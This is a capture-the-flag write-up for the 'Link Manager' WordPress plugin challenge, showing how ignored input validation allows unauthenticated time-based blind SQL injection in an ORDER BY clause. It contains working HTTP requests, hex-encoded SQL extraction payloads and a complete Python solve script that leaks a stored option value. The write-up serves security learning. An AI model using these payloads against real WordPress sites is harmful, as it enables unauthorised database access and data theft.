# Link Manager

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- 35 solves / 100 points
- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

I am very angry that WordPress dropped the support for Link Manager in version 3.5 release. I created my own plugin to cover that feature and it is still in the beta phase, can you check if everything's solid?

NOTE: This is a fully white box challenge, almost no heavy brute force is needed.

[http://100.25.255.51:9097/](http://100.25.255.51:9097/)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240921170528.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240921170909.png)

Nothing interested, it's just the default WordPress theme.

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/Link-Manager/attachment.zip):**
```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/Link-Manager)-[2024.09.21|17:09:53(HKT)]
└> file attachment.zip 
attachment.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/Link-Manager)-[2024.09.21|17:09:54(HKT)]
└> unzip attachment.zip 
Archive:  attachment.zip
   creating: server-given/
  inflating: server-given/deploy.sh  
  inflating: server-given/Makefile   
   creating: server-given/challenge-custom/
   creating: server-given/challenge-custom/link-manager/
  inflating: server-given/challenge-custom/link-manager/README.md  
  [...]
  inflating: server-given/challenge-custom/link-manager/link-manager.php  
   creating: server-given/docker/
   creating: server-given/docker/wordpress/
   creating: server-given/docker/wordpress/toolbox/
  inflating: server-given/docker/wordpress/toolbox/Makefile  
  inflating: server-given/docker/wordpress/toolbox/Dockerfile  
  inflating: server-given/Dockerfile  
  inflating: server-given/.env       
  inflating: server-given/docker-compose.yml  
```

After unzipping the zip file, we're given with the setup of the WordPress environment and a plugin called `link-manager`.

First off, what's our objective in this challenge? Where's the flag?

In file `server-given/.env`, we can see that the flag is defined in here:

```bash
FLAG_NAME="flag_links_data"
FLAG_VALUE="REDACTED"
```

This file is ultimately included in the MySQL database service's environment variable:

`server-given/docker-compose.yml`:

```yaml
  [...]
  wp_service_1_db:
    image: mysql:latest
    restart: always
    env_file: .env
```

Hmm... So the flag is in the MySQL database service's environment variable?

Well, nope. If we take a look at `server-given/docker/wordpress/toolbox/Makefile`, we can see that **the flag is stored in the [WordPress options API](https://developer.wordpress.org/plugins/settings/options-api/)**:

```yaml
[...]
install: configure

configure:
    [...]
    $(WP_CLI) option add ${FLAG_NAME} ${FLAG_VALUE}
```

With that said, we need to somehow exfiltrate the flag in the options API, perhaps via **SQL injection** or **arbitrary option read (i.e.: `get_option($user_input_here)`)**.

Without further ado, let's dive into the plugin source code!

Right off the bat, we can see that this plugin has 2 [AJAX actions](https://developer.wordpress.org/plugins/javascript/ajax/), which are `submit_link` and `get_link_data`:

`server-given/challenge-custom/link-manager/include/main-class.php`:

```php
add_action( 'wp_ajax_submit_link', 'handle_ajax_link_submission' );
add_action( 'wp_ajax_nopriv_submit_link', 'handle_ajax_link_submission' );
[...]
add_action('wp_ajax_get_link_data', 'get_link_data');
add_action('wp_ajax_nopriv_get_link_data', 'get_link_data');
```

Hmm... **Both of them do NOT require any authentication**, as they have prefix `nopriv`. According to the documentation of [`do_action( "wp_ajax_nopriv_{$action}" )`](https://developer.wordpress.org/reference/hooks/wp_ajax_nopriv_action/), this [hook](https://developer.wordpress.org/plugins/hooks/) name only fires for unauthenticated users.

Let's take a look at AJAX action `submit_link`. In the above, we can see that the callback function is `handle_ajax_link_submission`:

```php
function handle_ajax_link_submission() {
    // Strictly check for nonce
    check_ajax_referer('ajax_submit_link', 'nonce');

    $url = esc_url_raw($_POST['url']); 
    $name = sanitize_text_field($_POST['name']); 
    $description = sanitize_textarea_field($_POST['description']); 
    [...]
    global $wpdb;
    $table_name = $wpdb->prefix . 'links';
    $wpdb->insert(
        $table_name,
        array(
            'link_url' => $url,
            'link_name' => $name,
            'link_image' => $image,
            'link_description' => $description,
            'link_visible' => $visible,
            'link_owner' => $owner,
            'link_rating' => $rating,
            'link_updated' => $updated,
            'link_rel' => $rel,
            'link_notes' => $notes,
        ),
        array(
            '%s',
            '%s', 
            '%s', 
            '%s', 
            '%s', 
            '%d',
            '%d', 
            '%s',
            '%s', 
            '%s',
        )
    );
    [...]
}
```

In here, we can see that it uses [class `wpdb`](https://developer.wordpress.org/reference/classes/wpdb/) method [insert](https://developer.wordpress.org/reference/classes/wpdb/insert/) to insert a row into table `$wpdb->prefix . 'links'`. Unfortunately for us, the SQL statement is properly prepared using the `insert` method, which means it's not vulnerable to SQL injection.

Hmm... How about **AJAX action `get_link_data` callback function `get_link_data`**?

```php
function get_link_data() {
    global $wpdb;
    $table_name = $wpdb->prefix . 'links';
    $link_name = sanitize_text_field($_POST['link_name']);
    $order = sanitize_text_field($_POST['order']);
    $orderby = sanitize_text_field($_POST['orderby']);

    validate_order($order);
    validate_order_by($orderby);
    
    $results = $wpdb->get_results("SELECT * FROM wp_links where link_name = '$link_name' order by $orderby $order");
    [...]
}
```

As we can see, it uses class `wpdb` method [`get_results`](https://developer.wordpress.org/reference/classes/wpdb/get_results/) to get the records of the filtered `$link_name`.

Most importantly, **it directly concatenates our user inputs into the raw SQL query**!

Ah ha! Does that mean it's vulnerable to SQL injection? Well, our inputs are actually sanitized via WordPress function [`sanitize_text_field`](https://developer.wordpress.org/reference/functions/sanitize_text_field/) and validated via function `validate_order` and `validate_order_by`. However, it's worth noting that the main purpose of **WordPress function `sanitize_text_field` is to prevent XSS vulnerability**, NOT SQL injection. 

Let's try to bypass those sanitizations and validations!

Now, let's imagine we're injecting our SQL injection payload into POST parameter `link_name`.

First, we'll need to escape the single quote character (`'`). To do so, we can inject a single quote character and comment out the rest of the SQL query.

Also, to test this effectively, we can use [Xdebug](https://xdebug.org/) to debug the raw SQL query. For me, I used [a local environment from Wordfence's Discord](https://discord.com/channels/1197901373581303849/1199013923173712023/1199041121322537115) to set it up. After building and running the Docker containers, installing the plugin, start debugging, and setting a breakpoint in VS Code, we can send the following POST request:

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

action=get_link_data&link_name=test'&order=asc&orderby=link_name
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240921181556.png)

Then, we can view the raw SQL query in the "Debug Console" in VS Code:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240921181626.png)

As we can see, our single quote character is escaped by the backslash character (`\`).

Uhh... How about escape the single quote character via the backslash character?

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

action=get_link_data&link_name=test\&order=asc&orderby=link_name
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240921181759.png)

Nope. WordPress function `sanitize_text_field` also escaped our backslash character.

That means we can't exploit the SQL injection vulnerability via POST parameter `link_name`. How about the others?

Before our POST parameter `order` and `orderby` parses into the raw SQL query, it first validates them via function `validate_order` and `validate_order_by`:

In function `validate_order`, it checks our POST parameter `order` value is either string `ASC` or `DESC`. If it doesn't match, it'll return error `invalid_order` via [class `WP_Error`](https://developer.wordpress.org/reference/classes/wp_error/):

```php
function validate_order($input) {
    $allowed_order = array('ASC', 'DESC');

    $input_upper = strtoupper($input);

    if (in_array($input_upper, $allowed_order)) {
        return true;
    } else {
        return new WP_Error('invalid_order', 'Invalid order direction. Only ASC or DESC are allowed.');
    }
}
```

In function `validate_order_by`, it checks our POST parameter `orderby` value is either string `link_name` or `link_url`. If it doesn't match, it'll return error `invalid_order` via [class `WP_Error`](https://developer.wordpress.org/reference/classes/wp_error/):

```php
function validate_order_by($input) {
    $allowed_orderby = array('link_name', 'link_url');

    $input_upper = strtoupper($input);

    if (in_array($input_upper, $allowed_orderby)) {
        return true;
    } else {
        return new WP_Error('invalid_order', 'Invalid order direction. Only link_name or link_url are allowed.');
    }
}
```

However, if those functions returned an error, the callback function won't do anything with it! **Effectively making this validation completely useless**:

```php
function get_link_data() {
    [...]
    validate_order($order);
    validate_order_by($orderby);
```

With that said, we can exploit the SQL injection vulnerability in the `ORDER BY` clause!

> Note: This mistake can totally happen in a real plugin. Recently I found an [unauthenticated Remote Code Execution via race condition vulnerability](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/file-manager/bit-file-manager-60-655-unauthenticated-remote-code-execution-via-race-condition) in [Bit File Manager](https://wordpress.org/plugins/file-manager/), which has a very similar flawed validation. ([Writeup from Wordfence](https://www.wordfence.com/blog/2024/09/20000-wordpress-sites-affected-by-remote-code-execution-vulnerability-in-bit-file-manager-wordpress-plugin/))

To exploit `ORDER BY` SQL injection vulnerability, we can have a quick Google search and find [this Stack Exchange post](https://security.stackexchange.com/questions/234539/order-by-sort-direction-is-exploitable-in-sql-injection#comment480962_234542). In that post, the author replied that payload `,(select*from(select(sleep(10)))a)` did work.

In our case, we can use that payload in either POST parameter `order` or `orderby`.

> Note: If you use the payload in `orderby`, the `,` is not needed. Otherwise, it'll cause a SQL syntax error.

Let's try that!

```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 90

action=get_link_data&link_name=anything&order=asc&orderby=(select*from(select(sleep(10)))a)
```

**Executed SQL query:**
```sql
SELECT * FROM wp_links where link_name = 'anything' order by asc (select*from(select(sleep(10)))a)
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240921184636.png)

Nice! The response took 11 seconds, which means the SQL injection payload is working!

Now you may wonder: **How can we exfiltrate the flag in the WordPress option via this blind SQL injection vulnerability?**

To do so, we can use a conditional statement, such as this:

```sql
(SELECT IF(MID( (SELECT <column_name> FROM <table_name>) ,<start_position>,1)='<character_here>',SLEEP(1),NULL))
```

Beautified:

```sql
(
  SELECT 
    IF(
      MID(
        (
          SELECT 
            <column_name> 
          FROM 
            <table_name>
        ), 
        <start_position>, 
        1
      )= '<character_here>', 
      SLEEP(1), 
      NULL
    )
)
```

In the above payload, if the character of the `<start_position>` in column `<column_name>` table `<table_name>` equals to `<character_here>`, it'll `SLEEP` for 1 second. Otherwise, do nothing. Therefore, if the response has 1-second delay, we can know that we found the correct character at x position.

In WordPress options, all data is stored in the [wp_options] table. Inside this table, column `option_name` and `option_value` holds the option's name, and it's value, kind of like a key-value pair. In our case, we can get the flag option's value via option name `flag_links_data`. We can try to test it in our local environment:

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/Link-Manager)-[2024.09.21|19:11:45(HKT)]-[git://main ✗]
└> docker compose run --rm wpcli option add 'flag_links_data' 'REDACTED'
[...]
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/Link-Manager)-[2024.09.21|19:11:51(HKT)]
└> docker container list                                                
CONTAINER ID   IMAGE                               COMMAND                  CREATED             STATUS             PORTS                                                                                  NAMES
[...]
cafb4c17ae14   mysql:8.0.20                        "docker-entrypoint.s…"   About an hour ago   Up About an hour   0.0.0.0:3306->3306/tcp, :::3306->3306/tcp, 33060/tcp                                   mysql-wpd
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/Link-Manager)-[2024.09.21|19:11:59(HKT)]
└> docker exec -it cafb4c17ae14 /bin/bash
root@cafb4c17ae14:/# 
```

```shell
root@cafb4c17ae14:/# mysql -umydbuser -pmydbpassword -Dmydbname
[...]
mysql> SELECT option_value FROM wp_options WHERE option_name = 'flag_links_data';
+--------------+
| option_value |
+--------------+
| REDACTED     |
+--------------+
```

Now let's modify our payload to exfiltrate the flag option via conditional statement!

```sql
(SELECT IF(MID( (SELECT option_value FROM wp_options WHERE option_name = 'flag_links_data') ,<start_position>,1)='<character_here>',SLEEP(1),NULL))
```

Oh... Wait. We can't use single or double quote characters, because it'll be escaped by WordPress function `sanitize_text_field`:

```php
function get_link_data() {
    [...]
    $order = sanitize_text_field($_POST['order']);
    $orderby = sanitize_text_field($_POST['orderby']);
```

Don't worry! In MySQL, we can use **hex characters** to avoid using single or double quote characters!

```shell
mysql> SELECT HEX('flag_links_data');
+--------------------------------+
| HEX('flag_links_data')         |
+--------------------------------+
| 666C61675F6C696E6B735F64617461 |
+--------------------------------+
```

**Final payload:**
```sql
(SELECT IF(MID( (SELECT option_value FROM wp_options WHERE option_name = 0x666C61675F6C696E6B735F64617461) ,<start_position>,1)=0x<hex_character_here>,SLEEP(1),NULL))
```

However, when we try the above payload in the remote instance, it won't work?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Patchstack-WCUS-Capture-The-Flag/images/Pasted%20image%2020240921200031.png)

Maybe this is because **the `link_name` doesn't exist in the database**, thus the `ORDER BY` clause didn't get executed.

To solve this issue, we can first create a new link via AJAX action `submit_link`, then continue our SQL injection payload.

## Exploitation

Armed with the above information, we can write a solve script to exfiltrate the flag option's value!

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
import requests
import re
import random
from bs4 import BeautifulSoup
from binascii import hexlify
from string import ascii_letters, digits
from time import time

class Solver:
    def __init__(self, baseUrl):
        self.baseUrl = baseUrl
        self.session = requests.session()
        self.AJAX_NONCE_REGEX_PATTERN = re.compile('\'(.*)\'')
        self.AJAX_ENDPOINT = f'{self.baseUrl}/wp-admin/admin-ajax.php'
        self.AJAX_ACTION_SUBMIT_LINK = 'submit_link'
        self.AJAX_ACTION_GET_LINK_DATA = 'get_link_data'
        self.RANDOM_LINK_NAME = ''.join(random.choice(ascii_letters) for i in range(10))
        self.CHARACTER_SET = ascii_letters + digits + '{}_'
        self.COLUMN_NAME = 'option_value'
        self.TABLE_NAME = 'wp_options'
        self.FLAG_OPTION_NAME = hexlify(b'flag_links_data').decode()
        self.DELAY_TIME = 1

    def getNonce(self):
        print('[*] Getting a valid AJAX nonce...')
        soup = BeautifulSoup(self.session.get(self.baseUrl).text, 'html.parser')

        ajaxNonceVariable = soup.findAll('script')[6].text.strip()
        ajaxNonce = re.search(self.AJAX_NONCE_REGEX_PATTERN, ajaxNonceVariable).group(1)
        print(f'[+] Valid AJAX nonce: {ajaxNonce}')
        return ajaxNonce

    def createSubmitLink(self, nonce):
        print('[*] Creating a new submit link...')
        data = {
            'action': self.AJAX_ACTION_SUBMIT_LINK,
            'nonce': nonce,
            'url': 'http://example.com/',
            'name': self.RANDOM_LINK_NAME,
            'description': 'foobar'
        }
        responseStatusCode = self.session.post(self.AJAX_ENDPOINT, data=data).status_code
        if responseStatusCode != 200:
            print('[-] Unable to create a new submit link')
            exit(0)

        print(f'[+] Created a new submit link with name "{self.RANDOM_LINK_NAME}"')

    def leakFlag(self):
        print(f'[*] Leaking the flag option via blind SQL injection in AJAX action "{self.AJAX_ACTION_GET_LINK_DATA}"...')
        position = 1
        leakedCharacters = ''

        while True:
            for character in self.CHARACTER_SET:
                print(f'[*] Current leaking character: {character} at position {position}', end='\r')

                hexedCharacter = hexlify(character.encode()).decode()
                payload = f'(SELECT IF(MID( (SELECT option_value FROM wp_options WHERE option_name = 0x{self.FLAG_OPTION_NAME}) ,{position},1)=0x{hexedCharacter},SLEEP({self.DELAY_TIME}),NULL))'
                data = {
                    'action': self.AJAX_ACTION_GET_LINK_DATA,
                    'link_name': self.RANDOM_LINK_NAME,
                    'order': 'asc',
                    'orderby': payload
                }

                startTime = time()
                self.session.post(self.AJAX_ENDPOINT, data=data)
                endTime = time() - startTime

                if character == self.CHARACTER_SET[-1] and endTime <= 1:
                    print('\n[-] Looped through all the possible characters')
                    if len(leakedCharacters) != 0:
                        print(f'[+] Leaked characters: {leakedCharacters}')

                    exit(0)
                if endTime <= self.DELAY_TIME:
                    continue

                print(f'\n[+] Correct character {character} at position {position} | End time: {endTime}')
                position += 1
                leakedCharacters += character
                break

    def solve(self):
        ajaxNonce = self.getNonce()
        self.createSubmitLink(ajaxNonce)

        self.leakFlag()

if __name__ == '__main__':
    # baseUrl = 'http://localhost' # for local testing
    baseUrl = 'http://100.25.255.51:9097'
    solver = Solver(baseUrl)

    solver.solve()
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/Patchstack-WCUS-Capture-The-Flag/Link-Manager)-[2024.09.21|20:00:45(HKT)]
└> python3 solve.py                                  
[*] Getting a valid AJAX nonce...
[+] Valid AJAX nonce: 1021da9893
[*] Creating a new submit link...
[+] Created a new submit link with name "bgbycaGVoe"
[*] Leaking the flag option via blind SQL injection in AJAX action "get_link_data"...
[*] Current leaking character: c at position 1
[+] Correct character c at position 1 | End time: 1.4865663051605225
[*] Current leaking character: t at position 2
[+] Correct character t at position 2 | End time: 1.4844286441802979
[*] Current leaking character: f at position 3
[+] Correct character f at position 3 | End time: 1.4852914810180664
[*] Current leaking character: { at position 4
[+] Correct character { at position 4 | End time: 1.4850826263427734
[...]
[*] Current leaking character: } at position 33
[+] Correct character } at position 33 | End time: 1.4851508140563965
[*] Current leaking character: _ at position 34
[-] Looped through all the possible characters
[+] Leaked characters: ctf{ord3ring_sql_inj3ction_links}
```

- **Flag: `CTF{ord3ring_sql_inj3ction_links}`**

## Conclusion

What we've learned:

1. Time-based SQL injection in `ORDER BY` clause